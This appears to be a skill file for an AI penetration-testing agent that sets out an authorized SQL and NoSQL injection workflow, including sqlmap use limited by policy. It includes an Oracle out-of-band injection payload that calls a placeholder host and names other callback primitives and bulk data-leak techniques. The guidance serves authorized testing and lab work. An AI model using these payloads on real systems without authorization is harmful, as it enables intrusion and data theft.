---
name: sqli-workflow
description: Use for authorized SQL/NoSQL injection testing, SQLi evidence review, OOB SQLi planning, and choosing safe SQLi probes.
inject-priority: 6
trigger-keywords:
  - "\\b(sqli|sql injection|nosql injection|sqlmap)\\b"
  - "SQL注入|注入.*(登录|接口|参数)"
---

## SQLi Workflow

Use only inside the declared scope. Start with `sqli_probe_param`, then `sqli_boolean_diff`, then `sqli_time_probe` with a short delay if earlier checks are inconclusive.

1. Create or reuse a case for the target. Attach the baseline request with `artifact_add`.
2. Parse the request with `web_request_parse`.
3. Establish baseline: status, length, response shape and timing with `web_request_replay`.
4. Test one parameter at a time with quote/error probes via `web_request_mutate`.
5. If no error appears, compare true/false boolean payloads and call `web_response_diff`.
6. Use time probes only with short delays and low request counts.
7. For UNION work, use `sqli_union_plan`; do not dump data.
8. For NoSQL, use `nosql_injection_probe` payloads one field at a time.
9. For blind/OOB, generate a token with `oob_payload_generate(case_id=..., request_ref=..., probe_id=...)` and correlate real events with `oob_check_events`.

Evidence should include parameter, payload, full URL, response excerpt or timing delta, confidence, and a copy-paste curl command. Save decisive baseline/mutated requests and responses as artifacts, then add `evidence_add(kind='http'|'oob')`.

## OOB SQLi DBMS Discipline

Fingerprint the DBMS before choosing OOB primitives. Sending an MSSQL `xp_dirtree` payload to an Oracle backend will never produce a callback.

For PortSwigger Web Security Academy blind-SQLi-with-OOB labs, the SQLi track uses Oracle. Prefer the XML external entity primitive returned by `oob_payload_generate(category='sqli')`, typically:

```sql
EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://<host>/">%remote;]>'),'/l')
```

Do not start with `UTL_HTTP.REQUEST` or `UTL_INADDR.GET_HOST_ADDRESS` on those labs; package execute privileges are commonly revoked. Use one error-revealing request first when the DBMS is not known, then pick the matching OOB payload.

## Bulk Before Byte Loops

Each user turn has a tool-call ceiling. Prefer bulk-leak techniques (`UNION`, `GROUP_CONCAT`, error-based casts) that return the needed value in a small number of requests. If per-character extraction is unavoidable, run the inner loop inside one sandbox script/snippet instead of spending one agent tool call per byte.

### Bundled sqlmap

When deeper automation is needed, use ArgusAI's bundled sqlmap integration instead of a system PATH binary.

1. Check `sqlmap_status`. If `source` is `bundled`, run `sqlmap_plan_scan` directly; no installation step is needed.
2. If the bundled copy is missing in a development checkout, ask to run `sqlmap_install_update`; this clones/updates `https://github.com/sqlmapproject/sqlmap` under ArgusAI's user-data tools directory as a fallback.
3. Build a command with `sqlmap_plan_scan` before execution.
4. Run `sqlmap_run_scan` only after confirmation and only for in-scope targets.
5. Keep default safe mode first: `--batch --smart --risk=1 --level=1 --flush-session --parse-errors`.
6. Dangerous options such as dump, OS shell, file read/write and SQL shell are blocked by policy. Enumeration switches require explicit `allow_enumeration=true`.
7. Summarize sqlmap output as evidence: vulnerable flag, DBMS, parameter, payloads, output excerpt and exact command plan.
8. The runner uses ArgusAI's resolved Python runtime, not a system `sqlmap` binary. Output is written under ArgusAI's managed `sqlmap-output` tools directory.
9. Attach the sqlmap plan/output summary to the case as an artifact/evidence pair when the result matters.

